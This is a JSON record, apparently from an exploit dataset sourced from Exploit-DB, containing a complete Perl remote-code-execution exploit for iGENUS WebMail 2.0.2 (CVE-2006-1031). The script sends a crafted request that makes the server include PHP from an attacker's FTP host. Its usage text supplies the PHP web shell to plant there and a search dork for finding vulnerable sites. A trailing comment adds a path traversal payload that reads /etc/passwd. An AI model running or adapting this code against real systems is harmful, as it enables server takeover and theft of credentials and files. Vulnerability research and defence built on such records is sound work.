{
  "id": "1527",
  "title": "iGENUS WebMail 2.0.2 - &#039;config_inc.php&#039; Remote Code Execution",
  "cve": "CVE-2006-1031",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\nprint \"______________________________________________________\\r\\n\";\r\nprint \"iGENUS WebMail <= 2.0.2 remote commads xctn\\r\\n\";\r\nprint \"-> works against PHP5 with register_globals = On\\r\\n\";\r\nprint \"   & allow_url_fopen = On\\r\\n\";\r\nprint \"by rgod rgod<AT>autistici<DOT>org\\r\\n\";\r\nprint \"site: http://retrogod.altervista.org\\r\\n\\r\\n\";\r\nprint \"dork:  intitle:\\\"igenus webmail login\\\"\\r\\n\";\r\nprint \"______________________________________________________\\r\\n\";\r\n\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$loc=urlEncode($ARGV[2]);\r\n$cmd=\"\"; for ($i=3; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \"\\r\\nUsage:\\r\\n\";\r\nprint \"perl igenus_xpl.pl SERVER PATH FTP_LOCATION COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where iGENUS is installed.\\r\\n\";\r\nprint \"PATH           - Path to iGENUS (ex: /igenus/ or just /) \\r\\n\";\r\nprint \"FTP_LOCATION   - an FTP site with the code to include\\r\\n\";\r\nprint \"COMMAND        - a Unix command\\r\\n\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com ls -la\\r\\n\";\r\nprint \"perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com/subdir cat config_inc.php\\r\\n\\r\\n\";\r\nprint \"note: on ftp location you need this code in .config :\\r\\n\";\r\nprint \"<?php ob_clean();ini_set(\\\"max_execution_time\\\",0);passthru(\\$_GET[\\\"cmd\\\"]);die;?>\\r\\n\\r\\n\";\r\nexit();\r\n}\r\n\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n  print $sock \"GET \".$path.\"config/config_inc.php?cmd=\".$cmd.\"&SG_HOME=\".$loc.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n  while ($answer = <$sock>) {\r\n    print $answer;\r\n  }\r\n  close($sock);\r\n\r\n# ----------------> also, with magic_quotes_gpc = Off, try this:\r\n# http://[target]/[path]/?Lang=../../../../../../../../etc/passwd%00\r\n\r\n# milw0rm.com [2006-02-25]",
  "url": "https://www.exploit-db.com/exploits/1527"
}